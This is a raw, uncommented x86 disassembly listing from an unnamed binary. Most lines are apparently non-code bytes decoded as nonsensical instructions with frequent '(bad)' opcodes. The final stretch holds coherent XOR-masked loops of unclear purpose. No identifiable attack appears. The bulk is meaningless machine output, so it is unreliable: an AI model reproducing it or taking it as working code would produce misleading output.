  4058fb:	popf   
  4058fc:	push   ds
  4058fd:	xchg   esi,eax
  4058fe:	inc    edx
  4058ff:	mov    bl,0x62
  405901:	xlat   BYTE PTR ds:[ebx]
  405902:	(bad)  
  405903:	xor    BYTE PTR [ecx-0x37],ch
  405906:	pop    esp
  405907:	pushf  
  405908:	mov    esp,0xddc7e546
  40590d:	dec    eax
  40590e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40590f:	cmp    ah,ch
  405911:	ins    BYTE PTR es:[edi],dx
  405912:	imul   esp,edx,0x5b
  405915:	sub    cl,BYTE PTR [ecx+0x6a]
  405918:	xchg   DWORD PTR [esi-0x7c],esp
  40591b:	pop    edx
  40591c:	jbe    0x405903
  40591e:	(bad)  [ebx+0x1b]
  405921:	dec    ebp
  405922:	inc    ecx
  405923:	cdq    
  405924:	dec    ecx
  405925:	or     cl,BYTE PTR [eax]
  405927:	mov    ch,0xb0
  405929:	inc    eax
  40592a:	shl    ah,cl
  40592c:	ja     0x40595b
  40592e:	call   DWORD PTR [esi-0x4de5c1f7]
  405934:	pop    edx
  405935:	ret    
  405936:	dec    eax
  405937:	sar    DWORD PTR [ebx-0x3c3b739e],cl
  40593d:	cdq    
  40593e:	mov    ebx,0x7c7ffe30
  405943:	or     eax,0x9fbcb14b
  405948:	xchg   esp,eax
  405949:	sbb    eax,0xf7e6eef5
  40594e:	and    esp,DWORD PTR [ebx+0x591b2bcd]
  405954:	add    ecx,DWORD PTR [ecx]
  405956:	mov    BYTE PTR ds:0xf7424b7e,bl
  40595c:	cmp    al,0xba
  40595e:	ret    0x5f5f
  405961:	or     dh,ah
  405963:	cmc    
  405964:	jl     0x40590e
  405966:	xchg   al,dh
  405968:	add    BYTE PTR [edx-0x59],cl
  40596b:	pop    esi
  40596c:	xchg   edi,eax
  40596d:	dec    edi
  40596e:	mov    esi,ss
  405970:	inc    edi
  405971:	jae    0x405901
  405973:	bswap  edi
  405975:	dec    eax
  405976:	mov    ds:0x31d4af7d,eax
  40597b:	cld    
  40597c:	shl    DWORD PTR [ebx+eax*1-0x13],0xe2
  405981:	repnz icebp 
  405983:	loopne 0x405958
  405985:	xchg   edi,eax
  405986:	jmp    0xc34f:0x324b9414
  40598d:	fdivr  QWORD PTR [edi-0x43]
  405990:	sbb    edx,0x2a
  405993:	test   eax,0x4412f64c
  405998:	scas   al,BYTE PTR es:[edi]
  405999:	add    DWORD PTR [ebx],eax
  40599b:	adc    al,0xf7
  40599d:	mov    cl,0x50
  40599f:	xor    DWORD PTR [edx-0xb783e51],ecx
  4059a5:	add    esi,ebp
  4059a7:	faddp  st(4),st
  4059a9:	outs   dx,DWORD PTR ds:[esi]
  4059aa:	(bad)  
  4059ab:	dec    eax
  4059ac:	cmp    esi,DWORD PTR [ecx+0x78]
  4059af:	dec    esp
  4059b0:	bound  ebp,QWORD PTR [edx]
  4059b2:	sbb    eax,0x56f2f376
  4059b7:	dec    edx
  4059b8:	pop    esi
  4059b9:	mov    ch,0x14
  4059bb:	mov    ds:0x4b2445e8,al
  4059c0:	lds    ecx,FWORD PTR [edi-0x2f]
  4059c3:	add    edx,DWORD PTR [edx+0x7d3c0437]
  4059c9:	icebp  
  4059ca:	adc    al,0x27
  4059cc:	push   esi
  4059cd:	ret    
  4059ce:	ja     0x4059b2
  4059d0:	addr16 mov ds:0x49d0,eax
  4059d4:	loope  0x40595b
  4059d6:	mov    esi,0xc6874284
  4059db:	lods   al,BYTE PTR ds:[esi]
  4059dc:	xchg   esp,eax
  4059dd:	cmp    eax,0x7ef6ac1c
  4059e2:	jecxz  0x405a0b
  4059e4:	pop    esp
  4059e5:	sar    DWORD PTR [esp+eax*1-0x6],1
  4059e9:	shr    BYTE PTR [edi-0x36c198ea],cl
  4059ef:	jb     0x405a46
  4059f1:	stos   BYTE PTR es:[edi],al
  4059f2:	stos   BYTE PTR es:[edi],al
  4059f3:	mov    al,0x98
  4059f5:	lods   al,BYTE PTR ds:[esi]
  4059f6:	pop    edx
  4059f7:	loopne 0x405a54
  4059f9:	push   cs
  4059fa:	ds mov ah,0x96
  4059fd:	dec    BYTE PTR [ebx+edx*2]
  405a00:	loopne 0x4059f6
  405a02:	mov    esp,0x567beebe
  405a07:	sub    al,0xe9
  405a09:	stos   BYTE PTR es:[edi],al
  405a0a:	cmp    ah,BYTE PTR [esi+0x72]
  405a0d:	add    bh,BYTE PTR [eax+0x76]
  405a10:	es loopne 0x405a30
  405a13:	stos   DWORD PTR es:[edi],eax
  405a14:	ins    BYTE PTR es:[edi],dx
  405a15:	mov    dl,0xe2
  405a17:	callw  0xe4fb
  405a1b:	add    esp,edx
  405a1d:	fdiv   DWORD PTR [edx+0x67]
  405a20:	sub    ebp,DWORD PTR [edx]
  405a22:	jg     0x405a0e
  405a24:	loop   0x4059a9
  405a26:	out    0x59,eax
  405a28:	xchg   edx,eax
  405a29:	pop    esp
  405a2a:	pop    ss
  405a2b:	icebp  
  405a2c:	inc    eax
  405a2d:	jmp    0x4059e5
  405a2f:	ja     0x405a48
  405a31:	cmp    al,0xd
  405a33:	push   ds
  405a34:	sub    BYTE PTR [ebx],0x93
  405a37:	mov    ebp,DWORD PTR [ebx+0x363ba114]
  405a3d:	cmp    esp,ebp
  405a3f:	das    
  405a40:	adc    eax,0xad62b994
  405a45:	stc    
  405a46:	ror    DWORD PTR [ebp-0xe],0xd2
  405a4a:	mov    ch,BYTE PTR [edx-0x19]
  405a4d:	pushf  
  405a4e:	jle    0x4059f2
  405a50:	ja     0x405a91
  405a52:	and    eax,0x72b8312d
  405a57:	pop    esi
  405a58:	jno    0x4059fe
  405a5a:	(bad)  
  405a5b:	out    0x52,al
  405a5d:	mov    esp,0xf7998395
  405a62:	xlat   BYTE PTR ds:[ebx]
  405a63:	mov    edi,0xc4c18252
  405a68:	push   es
  405a69:	fsubr  DWORD PTR [ebx-0x16]
  405a6c:	pop    ss
  405a6d:	xlat   BYTE PTR ds:[ebx]
  405a6e:	and    edi,DWORD PTR [esi]
  405a70:	repz popf 
  405a72:	jg     0x405a02
  405a74:	adc    eax,edx
  405a76:	push   cs
  405a77:	jnp    0x405a52
  405a79:	mov    cl,0x33
  405a7b:	adc    eax,0xea09358a
  405a80:	ret    0x6467
  405a83:	(bad)  
  405a84:	push   esi
  405a85:	outs   dx,DWORD PTR ds:[esi]
  405a86:	std    
  405a87:	pop    esi
  405a88:	inc    eax
  405a89:	jns    0x405af0
  405a8b:	jns    0x405a1c
  405a8d:	repnz fild WORD PTR [esi+0x5d]
  405a91:	cmc    
  405a92:	pop    ss
  405a93:	ss (bad) 
  405a95:	aam    0x97
  405a97:	inc    ebp
  405a98:	sbb    bl,BYTE PTR [ecx-0x603f919e]
  405a9e:	and    eax,0x8c549356
  405aa3:	mov    al,ds:0x1b8369c8
  405aa8:	ss loop 0x405b00
  405aab:	les    eax,FWORD PTR [edi+0x45]
  405aae:	mov    dh,0x96
  405ab0:	xchg   edi,eax
  405ab1:	jg     0x405af0
  405ab3:	push   edi
  405ab4:	ret    0xce29
  405ab7:	cwde   
  405ab8:	add    eax,0xddbc0a7e
  405abd:	(bad)
  405ac1:	das    
  405ac2:	or     cl,BYTE PTR [ebx+0x30]
  405ac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ac6:	mov    ah,0x77
  405ac8:	mov    cl,0x8d
  405aca:	sbb    BYTE PTR [ecx+0x24],dl
  405acd:	pop    ebx
  405ace:	clc    
  405acf:	stos   DWORD PTR es:[edi],eax
  405ad0:	adc    al,0xe9
  405ad2:	outs   dx,BYTE PTR ds:[esi]
  405ad3:	fimul  DWORD PTR [edx+edx*1]
  405ad6:	popf   
  405ad7:	inc    eax
  405ad8:	ja     0x405aa0
  405ada:	or     DWORD PTR ds:0x41d03ada,esi
  405ae0:	adc    eax,0x9290cb3f
  405ae5:	popa   
  405ae6:	rcl    bl,1
  405ae8:	lock or al,0xe6
  405aeb:	dec    edx
  405aec:	push   ds
  405aed:	cmp    eax,0x30cb9b5d
  405af2:	mov    cl,0x1
  405af4:	in     al,dx
  405af5:	hlt    
  405af6:	jl     0x405a82
  405af8:	test   al,0x1e
  405afa:	jno    0x405afa
  405afc:	or     dh,BYTE PTR [eax]
  405afe:	and    DWORD PTR [ebx-0x1827b7d2],eax
  405b04:	pop    ss
  405b05:	lods   eax,DWORD PTR ds:[esi]
  405b06:	xchg   edx,eax
  405b07:	push   esi
  405b08:	inc    esi
  405b09:	outs   dx,DWORD PTR ds:[esi]
  405b0a:	cdq    
  405b0b:	xor    bl,BYTE PTR [ebp+eiz*2-0x43]
  405b0f:	fsubr  DWORD PTR [ebp-0x2e]
  405b12:	sar    bx,cl
  405b15:	nop
  405b16:	fadd   DWORD PTR [eax+0x5dbd926c]
  405b1c:	pop    esi
  405b1d:	push   ecx
  405b1e:	xor    BYTE PTR [ecx-0x60],0x9a
  405b22:	push   ecx
  405b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b24:	mov    al,0x35
  405b26:	addr16 inc ebx
  405b28:	fldcw  WORD PTR [ebp+0x7873c2f1]
  405b2e:	mov    WORD PTR [ecx+0x18],fs
  405b31:	ficomp DWORD PTR [ecx+0x753312b4]
  405b37:	jecxz  0x405b54
  405b39:	push   DWORD PTR cs:[ecx+0x2f]
  405b3d:	mov    edi,0xad9c769c
  405b42:	inc    ecx
  405b43:	in     al,dx
  405b44:	cld    
  405b45:	mov    dl,0x61
  405b47:	int    0xe4
  405b49:	loopne 0x405ba5
  405b4b:	loope  0x405ad4
  405b4d:	xchg   esp,eax
  405b4e:	and    esp,DWORD PTR [ecx+edx*4+0x3057fc7a]
  405b55:	add    al,0x73
  405b57:	in     al,0x2b
  405b59:	sti    
  405b5a:	lods   al,BYTE PTR ds:[esi]
  405b5b:	add    edx,DWORD PTR [esi-0x46]
  405b5e:	mov    al,ds:0xed3ed517
  405b63:	add    ebx,0x1f7261d1
  405b69:	ret    0x5f66
  405b6c:	into   
  405b6d:	xor    al,0xfc
  405b6f:	rol    dl,1
  405b71:	adc    esp,DWORD PTR [ecx+eiz*4-0x51]
  405b75:	dec    edi
  405b76:	mov    eax,0x668de388
  405b7b:	or     BYTE PTR [eax+edx*4],cl
  405b7e:	sub    eax,DWORD PTR [ebp+0x2a]
  405b81:	imul   eax,DWORD PTR [edx],0xffffffb2
  405b84:	gs sub al,0x6d
  405b87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b88:	retf   0x34bb
  405b8b:	pop    ss
  405b8c:	or     ch,al
  405b8e:	mov    al,0x85
  405b90:	bound  esp,QWORD PTR [edx]
  405b92:	(bad)  
  405b93:	imul   esp,DWORD PTR [ebp+ebx*4+0xc],0x734d07a3
  405b9b:	into   
  405b9c:	sub    eax,0x83fe3c50
  405ba1:	pop    edi
  405ba2:	jae    0x405bcf
  405ba4:	and    al,0xd0
  405ba6:	shl    DWORD PTR [eax+0x4],1
  405ba9:	add    dl,BYTE PTR [esi]
  405bab:	mov    ah,ah
  405bad:	scas   al,BYTE PTR es:[edi]
  405bae:	xor    ah,BYTE PTR [ebx]
  405bb0:	sbb    DWORD PTR [esi+0x4a8ccc2],ebp
  405bb6:	aam    0x9d
  405bb8:	mov    esp,0x5432d3cd
  405bbd:	lods   al,BYTE PTR ds:[esi]
  405bbe:	neg    BYTE PTR [ecx-0x1d8a2f5d]
  405bc4:	pop    eax
  405bc5:	aaa    
  405bc6:	jae    0x405c16
  405bc8:	sbb    dl,BYTE PTR [edx+0x7d]
  405bcb:	test   BYTE PTR [eax-0xb],ah
  405bce:	mov    ah,0xb6
  405bd0:	cs scas al,BYTE PTR es:[edi]
  405bd2:	pop    ds
  405bd3:	cs dec esi
  405bd5:	mov    bh,BYTE PTR [ecx-0x644d0515]
  405bdb:	push   ss
  405bdc:	nop
  405bdd:	dec    esp
  405bde:	and    al,0xfd
  405be0:	and    DWORD PTR [ebx-0x4481725d],esi
  405be6:	aam    0x71
  405be8:	jle    0x405c18
  405bea:	add    al,0xf5
  405bec:	and    esi,DWORD PTR ds:0xf01f204
  405bf2:	inc    ebp
  405bf3:	jle    0x405c03
  405bf5:	xlat   BYTE PTR ds:[ebx]
  405bf6:	xchg   esp,eax
  405bf7:	outs   dx,DWORD PTR ds:[esi]
  405bf8:	ins    BYTE PTR es:[edi],dx
  405bf9:	int    0xf3
  405bfb:	push   cs
  405bfc:	mov    al,ds:0x3f8a304
  405c01:	aad    0x75
  405c03:	push   ecx
  405c04:	xchg   edi,eax
  405c05:	scas   al,BYTE PTR es:[edi]
  405c06:	sub    ecx,ebp
  405c08:	jo     0x405bf5
  405c0a:	(bad)  
  405c0b:	xlat   BYTE PTR ds:[ebx]
  405c0c:	sbb    eax,0xd0d8863c
  405c11:	(bad)  
  405c13:	mov    ecx,0xc83661f3
  405c18:	pop    esi
  405c19:	xor    al,0xc5
  405c1b:	xchg   edi,eax
  405c1c:	push   ebx
  405c1d:	pop    es
  405c1e:	aaa    
  405c1f:	push   esi
  405c20:	push   eax
  405c21:	enter  0xa49b,0x8f
  405c25:	(bad)
  405c28:	dec    edi
  405c29:	mov    WORD PTR [ecx-0xbdbdf6],fs
  405c2f:	or     dh,BYTE PTR [edi+ecx*4]
  405c32:	(bad)  
  405c33:	jnp    0x405c64
  405c35:	push   esi
  405c36:	lods   al,BYTE PTR ds:[esi]
  405c37:	lods   eax,DWORD PTR ds:[esi]
  405c38:	xor    esp,DWORD PTR [ecx-0x394ba239]
  405c3e:	xchg   ebx,eax
  405c3f:	mov    dh,0x9b
  405c41:	fstp   TBYTE PTR [eax+edi*1-0x2b62f3d7]
  405c48:	push   ebx
  405c49:	adc    DWORD PTR [ebx+0x5bbe6dc8],0xb
  405c50:	xlat   BYTE PTR ds:[ebx]
  405c51:	pop    es
  405c52:	xor    al,0x36
  405c54:	pusha  
  405c55:	je     0x405c7a
  405c57:	popa   
  405c58:	int    0x3a
  405c5a:	cmc    
  405c5b:	mov    ecx,0xaf5c2af6
  405c60:	jno    0x405c24
  405c62:	adc    DWORD PTR [edx],edi
  405c64:	sbb    al,0x7b
  405c66:	pop    edx
  405c67:	xchg   ebp,eax
  405c68:	cmp    DWORD PTR [edi+0x290abbf],ebx
  405c6e:	sub    DWORD PTR [ebp+0x2f],ebp
  405c71:	in     eax,dx
  405c72:	(bad)  
  405c73:	ins    BYTE PTR es:[edi],dx
  405c74:	addr16 int3 
  405c76:	xor    eax,0x7d34de88
  405c7b:	test   al,0xc8
  405c7d:	daa    
  405c7e:	nop
  405c7f:	in     al,dx
  405c80:	jo     0x405c8b
  405c82:	pop    edx
  405c83:	scas   eax,DWORD PTR es:[edi]
  405c84:	jnp    0x405c27
  405c86:	jno    0x405cfd
  405c88:	inc    DWORD PTR [ecx]
  405c8a:	jmp    0x775926b2
  405c8f:	icebp  
  405c90:	xor    ebp,DWORD PTR [ebp-0x2f]
  405c93:	cli    
  405c94:	idiv   BYTE PTR [eax]
  405c96:	xor    eax,0x91af37d5
  405c9b:	pop    edi
  405c9c:	cdq    
  405c9d:	sbb    DWORD PTR [ecx],edx
  405c9f:	mov    esp,0x6c6b3b18
  405ca4:	(bad)  
  405ca5:	mov    edx,DWORD PTR [eax-0x1c0a3881]
  405cab:	lock pop ecx
  405cad:	dec    esp
  405cae:	dec    edi
  405caf:	scas   al,BYTE PTR es:[edi]
  405cb0:	mov    dh,0x8d
  405cb2:	stc    
  405cb3:	jae    0x405c41
  405cb5:	frstor [edx]
  405cb7:	ss jbe 0x405d2e
  405cba:	xor    DWORD PTR [ecx-0x4f3d947e],esp
  405cc0:	mov    edi,0xc68ffedd
  405cc5:	jp     0x405c6e
  405cc7:	sub    al,0x1c
  405cc9:	and    DWORD PTR es:[ebx+0x15f6b679],ecx
  405cd0:	pop    ebx
  405cd1:	pop    ebx
  405cd2:	inc    ebx
  405cd3:	sbb    DWORD PTR [eax-0x469a20af],edi
  405cd9:	mov    al,0x2c
  405cdb:	inc    esp
  405cdc:	mov    ecx,0x2f1e6c88
  405ce1:	push   es
  405ce2:	mov    ch,BYTE PTR [edx+esi*1]
  405ce5:	xchg   DWORD PTR [esi+0x35],eax
  405ce8:	jb     0x405c9c
  405cea:	xchg   ebx,eax
  405ceb:	or     edi,DWORD PTR [esi]
  405ced:	jae    0x405c9f
  405cef:	adc    eax,0x962914a0
  405cf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cf5:	push   ss
  405cf6:	dec    edx
  405cf7:	push   edi
  405cf8:	lea    eax,[eax+0x69]
  405cfb:	push   cs
  405cfc:	inc    edi
  405cfd:	jge    0x405d71
  405cff:	jmp    0x405cb7
  405d01:	scas   eax,DWORD PTR es:[edi]
  405d02:	push   edi
  405d03:	scas   al,BYTE PTR es:[edi]
  405d04:	xor    ecx,DWORD PTR [edi-0x4]
  405d07:	inc    esp
  405d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d09:	sbb    BYTE PTR [edx+0x6d],al
  405d0c:	nop
  405d0d:	call   0x51d15f6c
  405d12:	jp     0x405cf1
  405d14:	into   
  405d15:	in     eax,0x81
  405d17:	mov    BYTE PTR [edx],dl
  405d19:	out    0x95,al
  405d1b:	cdq    
  405d1c:	ret    0x5330
  405d1f:	(bad)  
  405d20:	outs   dx,BYTE PTR ds:[esi]
  405d21:	ret    
  405d22:	push   eax
  405d23:	ficom  DWORD PTR [ebp+0x82b955a]
  405d29:	fwait
  405d2a:	adc    edi,ecx
  405d2c:	sbb    eax,0x45c3afa7
  405d31:	out    0x2c,al
  405d33:	jbe    0x405da4
  405d35:	rol    DWORD PTR [edx],0x38
  405d38:	sar    esp,0xd0
  405d3b:	mov    ebp,0x3d31c1fa
  405d40:	fld    DWORD PTR [eax+0x3a2b0657]
  405d46:	dec    eax
  405d47:	addr16 je 0x405d83
  405d4a:	push   0x15
  405d4c:	push   edi
  405d4d:	aas    
  405d4e:	mov    ebx,0x409ba433
  405d53:	xchg   edx,eax
  405d54:	jecxz  0x405cdc
  405d56:	nop
  405d57:	pop    edi
  405d58:	sub    esp,edx
  405d5a:	dec    ebx
  405d5b:	not    BYTE PTR [ebx-0x4e]
  405d5e:	js     0x405d09
  405d60:	push   ecx
  405d61:	jbe    0x405d72
  405d63:	add    al,0xf9
  405d65:	xchg   esi,eax
  405d66:	and    al,0x36
  405d68:	pop    ds
  405d69:	scas   al,BYTE PTR es:[edi]
  405d6a:	enter  0x4d9c,0x41
  405d6e:	mov    ecx,eax
  405d70:	dec    esi
  405d71:	mov    bh,0x7c
  405d73:	mov    al,ds:0x5e54fee5
  405d78:	inc    edx
  405d79:	dec    edi
  405d7a:	sbb    edi,DWORD PTR [eax]
  405d7c:	mov    edi,0xc1ec604
  405d81:	add    DWORD PTR gs:[edx+0xe],ecx
  405d85:	dec    edi
  405d86:	or     BYTE PTR [ebx],bl
  405d88:	xchg   ecx,eax
  405d89:	dec    edx
  405d8a:	in     eax,0x22
  405d8c:	fistp  DWORD PTR [edi]
  405d8e:	lds    ecx,FWORD PTR [edi-0x7]
  405d91:	ss sahf 
  405d93:	push   ebp
  405d94:	push   ss
  405d95:	mov    al,0x32
  405d97:	jmp    0x4868:0xf4f47e9b
  405d9e:	cld    
  405d9f:	mov    cl,0xad
  405da1:	jmp    0xeb34:0xa2869e89
  405da8:	hlt    
  405da9:	cmp    al,0x2d
  405dab:	cli    
  405dac:	push   es
  405dad:	jne    0x405d81
  405daf:	test   al,0x8d
  405db1:	xchg   ebx,eax
  405db2:	cmc    
  405db3:	adc    BYTE PTR [edx+0x6947ef46],0x67
  405dba:	leave  
  405dbb:	test   eax,0xec0c06f8
  405dc0:	retf   0xe435
  405dc3:	je     0x405daa
  405dc5:	pop    ss
  405dc6:	lods   eax,DWORD PTR ds:[esi]
  405dc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dc8:	popa   
  405dc9:	hlt    
  405dca:	es adc eax,0xc0ceb791
  405dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dd1:	dec    esp
  405dd2:	loope  0x405d9e
  405dd4:	inc    esp
  405dd5:	not    dh
  405dd7:	popa   
  405dd8:	inc    ecx
  405dd9:	jp     0x405e59
  405ddb:	loope  0x405e0d
  405ddd:	mov    BYTE PTR [ecx],ah
  405ddf:	or     DWORD PTR [ecx-0x2a],0xcd0fc797
  405de6:	(bad)  
  405de7:	fs scas eax,DWORD PTR es:[edi]
  405de9:	test   eax,0xaee6cd6e
  405dee:	leave  
  405def:	test   al,0x96
  405df1:	ins    DWORD PTR es:[edi],dx
  405df2:	mov    ah,0xdf
  405df4:	cmp    BYTE PTR [edi+eax*2+0x7f2fe681],0x40
  405dfc:	gs xor eax,0x8f0bebd8
  405e03:	call   0x384c:0x885d4a2a
  405e0a:	imul   ch
  405e0c:	fidiv  DWORD PTR [esp+eax*2+0x4f461ba2]
  405e13:	xor    eax,0x64762654
  405e18:	dec    edx
  405e19:	mov    ds:0xac9c597c,eax
  405e1e:	daa    
  405e1f:	jle    0x405e6d
  405e21:	lds    eax,FWORD PTR [ebp+0x73]
  405e24:	mov    esp,0x9150357f
  405e29:	hlt    
  405e2a:	leave  
  405e2b:	add    DWORD PTR [esi],ebp
  405e2d:	jl     0x405dc6
  405e2f:	fwait
  405e30:	and    al,0xc2
  405e32:	dec    ebx
  405e33:	mov    eax,ds:0x336b0e67
  405e38:	loopne 0x405dc5
  405e3a:	mov    bh,0xc1
  405e3c:	adc    al,bh
  405e3e:	loop   0x405e57
  405e40:	jge    0x405e4c
  405e42:	leave  
  405e43:	test   DWORD PTR [ecx],esi
  405e45:	jo     0x405ec0
  405e47:	mov    BYTE PTR [edx+ebx*1+0x46],dl
  405e4b:	outs   dx,BYTE PTR fs:[esi]
  405e4d:	imul   edx,DWORD PTR [ecx],0xfffffffb
  405e50:	shl    DWORD PTR [edi-0x51],cl
  405e53:	xchg   esp,eax
  405e54:	cmp    eax,0xedbecbc3
  405e59:	or     BYTE PTR ds:0x4f596ff5,ah
  405e5f:	cmp    BYTE PTR [eax],ah
  405e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e62:	hlt    
  405e63:	fdivr  QWORD PTR [eax+ecx*2]
  405e66:	(bad)  
  405e67:	cld    
  405e68:	mov    edx,DWORD PTR [ecx-0x62]
  405e6b:	dec    ebx
  405e6c:	aas    
  405e6d:	mov    ah,bh
  405e6f:	lods   eax,DWORD PTR ds:[esi]
  405e70:	(bad)  
  405e72:	xchg   esp,eax
  405e73:	mov    esi,0xe4e711ab
  405e78:	xor    al,0x4b
  405e7a:	sbb    eax,0xce5967e1
  405e7f:	mov    ebx,0xbded9a8
  405e84:	jmp    DWORD PTR [ebx+0x32]
  405e87:	mov    bl,0xe4
  405e89:	cmp    bl,dl
  405e8b:	xor    ebp,DWORD PTR [eax]
  405e8d:	mov    DWORD PTR [ebx-0x72460e58],esp
  405e93:	(bad)  
  405e94:	pop    edx
  405e95:	(bad)  
  405e96:	xor    bh,BYTE PTR [ebp-0x4448c683]
  405e9c:	loop   0x405edf
  405e9e:	enter  0xb60c,0x9d
  405ea2:	push   ebx
  405ea3:	sub    DWORD PTR ds:[edi],ebx
  405ea6:	pop    esp
  405ea7:	retf   0x459d
  405eaa:	xchg   edx,eax
  405eab:	mov    esp,0x486e1e34
  405eb0:	mov    eax,ds:0xf471f857
  405eb5:	into   
  405eb6:	ins    DWORD PTR es:[edi],dx
  405eb7:	in     al,dx
  405eb8:	fs jno 0x405e5f
  405ebb:	xor    ch,dh
  405ebd:	ret    
  405ebe:	nop
  405ebf:	ror    BYTE PTR [edx],cl
  405ec1:	adc    DWORD PTR [eax+0x2abf860d],esi
  405ec7:	retf   
  405ec8:	jo     0x405f00
  405eca:	xchg   esi,eax
  405ecb:	inc    ebx
  405ecc:	loope  0x405f31
  405ece:	in     al,dx
  405ecf:	push   eax
  405ed0:	xlat   BYTE PTR ds:[ebx]
  405ed1:	sbb    esp,DWORD PTR [ebp+0x6b0edcba]
  405ed7:	mov    al,0xe7
  405ed9:	imul   eax,DWORD PTR [edx+0x48],0x35
  405edd:	pop    ecx
  405ede:	inc    ebp
  405edf:	push   ds
  405ee0:	mov    al,0x85
  405ee2:	das    
  405ee3:	in     eax,0x39
  405ee5:	loope  0x405f5c
  405ee7:	div    al
  405ee9:	stc    
  405eea:	cwde   
  405eeb:	cld    
  405eec:	sub    eax,0x551c716b
  405ef1:	jbe    0x405f34
  405ef3:	add    esi,DWORD PTR [eax-0x5246b816]
  405ef9:	lahf   
  405efa:	test   al,0xe8
  405efc:	and    BYTE PTR [eax-0x65618be6],cl
  405f02:	mov    ebx,edx
  405f04:	out    0xc6,al
  405f06:	cmp    al,0x1c
  405f08:	jns    0x405edb
  405f0a:	ja     0x405f36
  405f0c:	adc    al,0xe
  405f0e:	ss dec ecx
  405f10:	loop   0x405eb9
  405f12:	jg     0x405f8a
  405f14:	das    
  405f15:	fist   DWORD PTR [esp+eax*4-0x41]
  405f19:	add    al,0x29
  405f1b:	mov    ah,0x25
  405f1d:	pushf  
  405f1e:	add    ecx,DWORD PTR [ebp+0x0]
  405f21:	stos   DWORD PTR es:[edi],eax
  405f22:	add    al,0x7f
  405f24:	pop    ss
  405f25:	imul   ebp,DWORD PTR [esi-0x461b54d3],0x1911cf39
  405f2f:	and    al,0x8b
  405f31:	push   ebp
  405f32:	or     BYTE PTR [ebx],dh
  405f34:	rol    BYTE PTR [ecx-0x1],1
  405f37:	inc    ebp
  405f38:	call   0xca7c3540
  405f3d:	jb     0x403b83
  405f43:	jmp    0x405f8d
  405f48:	mov    ecx,DWORD PTR [ebp-0xc]
  405f4b:	mov    DWORD PTR [ebp+0x8],ecx
  405f4e:	jmp    0x405f80
  405f53:	mov    ecx,DWORD PTR [ebp+0x8]
  405f56:	mov    edx,DWORD PTR [ebp-0x8]
  405f59:	xor    ecx,eax
  405f5b:	xor    edx,eax
  405f5d:	sub    ecx,edx
  405f5f:	sub    ecx,esi
  405f61:	xor    ecx,eax
  405f63:	mov    DWORD PTR [ebp+0x8],ecx
  405f66:	mov    ecx,DWORD PTR [ebp+0x8]
  405f69:	mov    edx,DWORD PTR [ebp+0x8]
  405f6c:	imul   edx,edx,0x5708f5
  405f72:	xor    ecx,eax
  405f74:	add    ecx,esi
  405f76:	lea    ecx,[ebp+ecx*4-0x64]
  405f7a:	mov    edi,DWORD PTR [ecx]
  405f7c:	add    edx,edi
  405f7e:	mov    DWORD PTR [ecx],edx
  405f80:	mov    ecx,DWORD PTR [ebp+0x8]
  405f83:	xor    ecx,eax
  405f85:	add    ecx,esi
  405f87:	jne    0x405f53
  405f8d:	mov    ecx,DWORD PTR [ebp-0xc]
  405f90:	mov    DWORD PTR [ebp+0x8],ecx
  405f93:	jmp    0x405fc5
  405f98:	mov    ecx,DWORD PTR [ebp+0x8]
  405f9b:	mov    edx,DWORD PTR [ebp-0x8]
  405f9e:	xor    ecx,eax
  405fa0:	xor    edx,eax
  405fa2:	sub    ecx,edx
  405fa4:	sub    ecx,esi
  405fa6:	xor    ecx,eax
  405fa8:	mov    DWORD PTR [ebp+0x8],ecx
  405fab:	mov    ecx,DWORD PTR [ebp+0x8]
  405fae:	mov    edx,DWORD PTR [ebp+0x8]
  405fb1:	imul   edx,edx,0x5708f5
  405fb7:	xor    ecx,eax
  405fb9:	add    ecx,esi
  405fbb:	lea    ecx,[ebp+ecx*4-0x64]
  405fbf:	mov    edi,DWORD PTR [ecx]
  405fc1:	add    edx,edi
  405fc3:	mov    DWORD PTR [ecx],edx
  405fc5:	mov    ecx,DWORD PTR [ebp+0x8]
  405fc8:	xor    ecx,eax
  405fca:	add    ecx,esi
  405fcc:	jne    0x405f98
  405fd2:	mov    ecx,DWORD PTR [ebp-0x8]
  405fd5:	mov    edx,DWORD PTR [ebp-0x20]
  405fd8:	xor    ecx,eax
  405fda:	lea    ecx,[ecx+edx*1+0x3272db]
  405fe1:	mov    DWORD PTR [ebp-0x20],ecx
  405fe4:	inc    DWORD PTR [ebp+0xc]
  405fe7:	mov    ecx,DWORD PTR [ebp-0x1c]
  405fea:	xor    ecx,eax
  405fec:	add    ecx,esi
  405fee:	jne    0x401627
  405ff4:	jmp    0x40607d
  405ff9:	mov    ecx,DWORD PTR [ebp-0xc]
  405ffc:	mov    DWORD PTR [ebp+0x8],ecx
  405fff:	jmp    0x406031
  406004:	mov    ecx,DWORD PTR [ebp+0x8]
  406007:	mov    edx,DWORD PTR [ebp-0x8]
  40600a:	xor    ecx,eax
  40600c:	xor    edx,eax
  40600e:	sub    ecx,edx
  406010:	sub    ecx,esi
  406012:	xor    ecx,eax
  406014:	mov    DWORD PTR [ebp+0x8],ecx
  406017:	mov    ecx,DWORD PTR [ebp+0x8]
  40601a:	mov    edx,DWORD PTR [ebp+0x8]
  40601d:	imul   edx,edx,0x5708f5
  406023:	xor    ecx,eax
  406025:	add    ecx,esi
  406027:	lea    ecx,[ebp+ecx*4-0x64]
  40602b:	mov    edi,DWORD PTR [ecx]
  40602d:	add    edx,edi
  40602f:	mov    DWORD PTR [ecx],edx
  406031:	mov    ecx,DWORD PTR [ebp+0x8]
  406034:	xor    ecx,eax
  406036:	add    ecx,esi
  406038:	jne    0x406004
  40603e:	jmp    0x406089
  406043:	mov    ecx,DWORD PTR [ebp+0x8]
  406046:	mov    edx,DWORD PTR [ebp-0x8]
  406049:	xor    ecx,eax
  40604b:	xor    edx,eax
  40604d:	sub    ecx,edx
  40604f:	sub    ecx,esi
  406051:	xor    ecx,eax
  406053:	mov    DWORD PTR [ebp+0x8],ecx
  406056:	mov    ecx,DWORD PTR [ebp+0x8]
  406059:	mov    edx,DWORD PTR [ebp+0x8]
